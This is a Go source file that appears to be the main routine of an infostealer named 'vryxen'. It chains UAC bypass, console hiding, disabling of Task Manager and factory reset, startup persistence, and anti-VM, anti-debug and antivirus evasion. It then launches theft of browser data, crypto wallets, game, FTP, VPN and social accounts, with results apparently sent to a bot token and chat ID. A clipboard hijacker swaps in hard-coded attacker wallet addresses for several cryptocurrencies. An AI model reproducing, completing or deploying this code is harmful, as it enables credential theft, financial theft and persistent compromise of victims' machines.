package main

import (
	"github.com/unf6/vryxen/internal/antidebug"
	"github.com/unf6/vryxen/internal/antivm"
	"github.com/unf6/vryxen/internal/antivirus"
	"github.com/unf6/vryxen/internal/fakerr"
	"github.com/unf6/vryxen/internal/hc"
	"github.com/unf6/vryxen/pkg/utils/startup"
	"github.com/unf6/vryxen/internal/uac"
	"github.com/unf6/vryxen/pkg/utils/common"
	"github.com/unf6/vryxen/pkg/utils/processkill"
    "github.com/unf6/vryxen/internal/fr"
	"github.com/unf6/vryxen/internal/taskmanager"


	
	"github.com/unf6/vryxen/internal/core/socials"
	"github.com/unf6/vryxen/internal/core/cryptowallets"
	"github.com/unf6/vryxen/internal/core/ftps"
	"github.com/unf6/vryxen/internal/core/games"
	"github.com/unf6/vryxen/internal/core/system"
	"github.com/unf6/vryxen/internal/core/browsers"
	"github.com/unf6/vryxen/internal/core/clipper"
	"github.com/unf6/vryxen/internal/core/commonfiles"
	"github.com/unf6/vryxen/internal/core/vpn"
)

var botToken string
var chatId string

func main() {
	CONFIG := map[string]interface{}{
		"botToken": botToken,
		"chatId": chatId,
		"cryptos": map[string]string{
			"BTC": "bc1qr85hew3n2xcufmh59299mnpt46nzpnd746gksh",
			"BCH": "",
			"ETH": "0x5989a6be6de95ee566526750c4AC9C6Ea9CbEba3",
			"XMR": "",
			"LTC": "LNZdCeEmGSbnUeA9eyRHtkok45KHfZUnWq",
			"XCH": "",
			"XLM": "",
			"TRX": "TXrZgcxmzwoAazhuvhX31iYFvHPo3mu2ew",
			"ADA": "",
			"DASH": "XqxWKQviNx6ZPPKjp5Wu1zmhvBWGuNTSQF",
			"DOGE": "DEm6Fp8swrKsGipeok36SeUq98CB9bCo9J",
		},
	}

	if common.IsAlreadyRunning() {
		return
	}

	Uac.Run()
	processkill.Run()

	HideConsole.Hide()
	common.HideSelf()
	FactoryReset.Disable()
	TaskManager.Disable()

	
	if !common.IsInStartupPath() {
		go FakeError.Show()
		go startup.Run()
	}

	AntiVMAnalysis.Check()
	go antidebug.Run()
	go antivirus.Run()

	actions := []func(string, string){
		system.Run,
		browsers.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
		ftps.Run,
		vpn.Run,
		Socials.Run,
	}

	for _, action := range actions {
		go action(CONFIG["botToken"].(string), CONFIG["chatId"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
